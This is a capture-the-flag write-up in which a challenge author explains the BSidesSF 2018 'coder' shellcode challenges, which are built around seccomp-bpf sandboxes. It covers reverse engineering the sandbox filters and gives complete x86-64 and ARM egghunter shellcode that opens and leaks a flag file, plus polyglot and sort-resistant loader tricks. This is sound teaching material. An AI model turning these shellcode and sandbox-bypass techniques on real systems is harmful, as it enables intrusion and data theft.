---
layout: post
title: "BSidesSF CTF 2018: Coder Series (Author's PoV)"
category: Security
date: 2018-04-21
tags:
  - CTF
  - Writeups
---

## Introduction ##

As the author of the "coder" series of challenges (Intel Coder, ARM Coder, Poly
Coder, and OCD Coder) in the recent BSidesSF CTF, I wanted to share my
perspective on the challenges.  I can't tell if the challenges were
uninteresting, too hard, or both, but they were solved by far fewer teams than I
had expected.  (And than we had rated the challenges for when scoring them.)

The entire series of challenges were based on the premise "give me your
shellcode and I'll run it", but with some limitations.  Rather than forcing
players to find and exploit a vulnerability, we wanted to teach players about
dealing with restricted environments like sandboxes, unusual architectures, and
situations where your shellcode might be manipulated by the process before it
runs.

<!--more-->

<!--foo-->

### Overview ###

Each challenge requested the length of your shellcode followed by the shellcode
and allowed for ~1k of shellcode (which is more than enough for any reasonable
exploitation effort on these).  Shellcode was placed into newly-allocated memory
with `RWX` permissions, with a guard page above and below.  A new stack was
allocated similarly, but without the execute bit set.

Each challenge got a `seccomp-bpf` sandbox setup, with slight variations in the
limitations of the sandbox to encourage players to look into how the sandbox is
created:

- All challenges allowed `rt_sigreturn()`, `exit()`, `exit_group()` and
  `close()` for housekeeping purposes.
- **Intel Coder** allowed `open()` (with limited arguments) and `sendfile()`.
- **ARM Coder** allowed `open()`, `read()`, and `write()`, all with limited
  arguments.
- **Poly Coder** allowed `read()` and `write()`, but the file descriptors were
  already opened for the player.
- **OCD Coder** allowed `open()`, `read()`, `write()` and `sendfile()` with
  restrictions.

The shellcode was then executed by a helper function written in assembly.  (To
swap the stack then execute the shellcode.)

There were a few things that made these challenges harder than they might have
otherwise been:

- Stripped binaries
- PIE binaries and ASLR
- Statically linking libseccomp (although I *thought* I was doing players a
  favor with this, it does make the binary much larger)

### A Seccomp Primer ###

Seccomp initially was a single system call that limited the calling thread to
use a small subset of syscalls.  `seccomp-bpf` extended this to use Berkeley
Packet Filters (BPF) to allow for filtering system calls.  The system call
number and arguments (from registers) are placed into a structure, and the BPF
is used to filter this structure.  The filter can result in allowing or denying
the syscall, and on a denied syscall, an error may be returned, a signal may be
delivered to the calling thread, or the thread may be killed.

Because all of the registers are included in the structure, `seccomp-bpf` allows
for filtering not only based on the system call itself, but on the arguments
passed to the system call.  One quirk of this is that it is completely unaware
of the types of the arguments, and only operates on the contents of the
registers used for passing arguments.  Consequently, pointer types are compared
by the **pointer value** and not by the **contents pointed to**.  I actually
hadn't thought about this before writing this challenge and limiting the values
passed to `open()`.  All of the challenges allowing open limited it to
`./flag.txt`, so not only could you only open that one file, you could only do
it by using the same pointer that was passed to the library functions that setup
the filtering.

An interesting corollary is that if you limit system call arguments by passing
in a pointer value, you probably want it to be a global, and you probably don't
want it to be in writable memory, so that an attacker can't overwrite the
desired string and still pass the same pointer.

### Reverse Engineering the Sandbox ###

There's a wonderful toolset called
[seccomp-tools](https://github.com/david942j/seccomp-tools) that provides the
ability to dump the BPF structure from the process as it runs by using
`ptrace()`.  If we run the Intel coder binary under `seccomp-tools`, we'll see
the following structure:

     line  CODE  JT   JF      K
    =================================
     0000: 0x20 0x00 0x00 0x00000004  A = arch
     0001: 0x15 0x00 0x11 0xc000003e  if (A != ARCH_X86_64) goto 0019
     0002: 0x20 0x00 0x00 0x00000000  A = sys_number
     0003: 0x35 0x0f 0x00 0x40000000  if (A >= 0x40000000) goto 0019
     0004: 0x15 0x0d 0x00 0x00000003  if (A == close) goto 0018
     0005: 0x15 0x0c 0x00 0x0000000f  if (A == rt_sigreturn) goto 0018
     0006: 0x15 0x0b 0x00 0x00000028  if (A == sendfile) goto 0018
     0007: 0x15 0x0a 0x00 0x0000003c  if (A == exit) goto 0018
     0008: 0x15 0x09 0x00 0x000000e7  if (A == exit_group) goto 0018
     0009: 0x15 0x00 0x09 0x00000002  if (A != open) goto 0019
     0010: 0x20 0x00 0x00 0x00000014  A = args[0] >> 32
     0011: 0x15 0x00 0x07 0x00005647  if (A != 0x5647) goto 0019
     0012: 0x20 0x00 0x00 0x00000010  A = args[0]
     0013: 0x15 0x00 0x05 0x8bd01428  if (A != 0x8bd01428) goto 0019
     0014: 0x20 0x00 0x00 0x0000001c  A = args[1] >> 32
     0015: 0x15 0x00 0x03 0x00000000  if (A != 0x0) goto 0019
     0016: 0x20 0x00 0x00 0x00000018  A = args[1]
     0017: 0x15 0x00 0x01 0x00000000  if (A != 0x0) goto 0019
     0018: 0x06 0x00 0x00 0x7fff0000  return ALLOW
     0019: 0x06 0x00 0x00 0x00000000  return KILL

The first two lines check the architecture of the running binary (presumably
because the system call numbers are architecture-dependent).  The filter then
loads the system call number to determine the behavior for each syscall.  Lines
0004 through 0008 are syscalls that are allowed unconditionally.  Line 0009
ensures that anything but the already-allowed syscalls or `open()` results in
killing the process.

Lines 0010-0017 check the arguments passed to `open()`.  Since the BPF can only
compare 32 bits at a time, the 64-bit registers are split in two with shifts.
The first few lines ensure that the filename string (`args[0]`) is a pointer
with value `0x56478bd01428`.  Of course, due to ASLR, you'll find that this
value varies with each execution of the program, so no hard coding your pointer
values here!  Finally, it checks that the second argument (`args[1]`) to
`open()` is `0x0`, which corresponds to `O_RDONLY`.  (No opening the flag for
writing!)

`seccomp-tools` really makes this so much easier than manual reversing would be.

### Solving Intel & ARM Coder ###

The solutions for both Intel Coder and ARM Coder are very similar.  First, let's
determine the steps we need to undertake:

1. Locate fhe `./flag.txt` string that was used in the seccomp-bpf filter.
2. Open `./flag.txt`.
3. Read the file and send the contents to the player.  (`sendfile()` on Intel,
   `read()` and `write()` on ARM)

In order to not be a *total* jerk in these challenges, I ensured that one of the
registers contained a value *somewhere* in the `.text` section of the binary, to
make it somewhat easier to hunt for the `./flag.txt` string.  (This was actually
always the address of the function that executed the player shellcode.)
Consequently, finding the string should have been trivial using the commonly
known **egghunter** techniques.

At this point, it's basically just a straightforward shellcode to `open()` the
file and send its contents.  The entirety of my example solution for Intel Coder
is:

    BITS 64

    ; hunt for string based on rdx
    hunt:
    add rdx, 0x4
    mov rax, 0x742e67616c662f2e   ; ./flag.t
    cmp rax, [rdx]
    jne hunt

    xor rax, rax
    mov rdi, rdx              ; path
    xor rax, rax
    mov al, 2                 ; rax for SYS_open
    xor rdx, rdx              ; mode
    xor rsi, rsi              ; flags
    syscall

    xor rdi, rdi
    inc rdi                   ; out_fd
    mov rsi, rax              ; in_fd from open
    xor rdx, rdx              ; offset
    mov r10, 0xFF             ; count
    mov rax, 40               ; SYS_sendfile
    syscall

    xor rax, rax
    mov al, 60                ; SYS_exit
    xor rdi, rdi              ; code
    syscall

For ARM coder, the solution is much the same, except using `read()` and
`write()` instead of `sendfile()`.

    .section .text
    .global shellcode
    .arm

    shellcode:
      # r0 = my shellcode
      # r1 = new stack
      # r2 = some pointer

      # load ./fl into r3
      MOVW r3, #0x2f2e
      MOVT r3, #0x6c66
      # load ag.t into r4
      MOVW r4, #0x6761
      MOVT r4, #0x742e
    hunt:
      LDR r5, [r2, #0x4]!
      TEQ r5, r3
      BNE hunt
      LDR r5, [r2, #0x4]
      TEQ r5, r4
      BNE hunt
      # r2 should now have the address of ./flag.txt

      # SYS_open
      MOVW r7, #5
      MOV r0, r2
      MOVW r1, #0
      MOVW r2, #0
      SWI #0

      # SYS_read
      MOVW r7, #3
      MOV r1, sp
      MOV r2, #0xFF
      SWI #0

      # SYS_write
      MOVW r7, #4
      MOV r2, r0
      MOV r1, sp
      MOVW r0, #1
      SWI #0

      # SYS_exit
      MOVW r7, #1
      MOVW r0, #0
      SWI #0

### Poly Coder ###

Poly Coder was actually not very difficult if you had solved both of the above
challenges.  It required only reading from an already open FD and writing to an
already open FD.  You did have to search through the FDs to find which were
open, but this was easy as any that were not would return -1, so looping until
an amount greater than 0 was read/written was all that was required.

To produce shellcode that ran on both architectures, you could use an
instruction that was a jump in one architecture and benign in the other.  One
such example is `EB 7F 00 32`, which is a `jmp 0x7F` in `x86_64`, but does some
AND operation on `r0` in `ARM`.  Prefixing your shellcode with that, followed by
up to 120 bytes of ARM shellcode, then a few bytes of padding, and the `x86_64`
shellcode at the end would work.

### OCD Coder ###

As I recall it, one of the other members of our CTF organizing team joked "we
should sort their shellcode before we run it."  While intended as a joke, I took
this as a challenge and began work to see if this was solvable.  Obviously, the
smaller the granularity (e.g., sorting by byte) the more difficult this becomes.
I settled on trying to find a solution where it was sorted by 32-bit (DWORD)
chunks, and found one with about 2 hours of effort.

Rather than try to write the entire shellcode in something that would sort
correctly, I wrote a small loader that was manually tweaked to sort.  This
loader would then take the following shellcode and extract the lower 3 bytes of
each DWORD and concatenate them.  In this way, I could force ordering by
inserting a one-byte tag at the most significant position of each 3 byte chunk.

It looks something like this:

    [tag][3 bytes shellcode]
    [tag][3 bytes shellcode]
    [tag][3 bytes shellcode]

    ...

    [3 bytes shellcode][3 by
    tes shellcode][3 bytes s
    hellcode]

The loader is as simple as this:

    BITS 32

    # assumes shellcode @eax
    mov ecx, 0x24
    and eax, eax
    add eax, ecx
    mov ebx, eax
    inc edx
    loop:
      mov edx, [eax]
      nop
      add eax, 4
      nop
      mov [ebx], edx
      inc ebx
      inc ebx
      nop
      inc ebx
      nop
      nop
      nop
      dec ecx
      nop
      nop
      nop
      jnz loop
    nop

The large number of nops was necessary to get the loader to sort properly, as
were tricks like using 3 `inc ebx` instructions instead of `add ebx, 3`.
There's even trash instructions like `inc edx` that have no affect on the
output, but serve just to get the shellcode to sort the way I needed.  The [x86
opcode reference](http://ref.x86asm.net/coder.html) was incredibly useful in
finding bytes with the desired value to make things work.

I have no doubt there are shorter or more efficient solutions, but this got the
job done.

### Conclusion ###

We'll soon be releasing the source code to all of the challenges, so you can see
the details of how this was all put together, but I wanted to share my insight
into the challenges from the author's point of view.  Hopefully those that did
solve it (or tried to solve it) had a good time doing so or learned something
new.
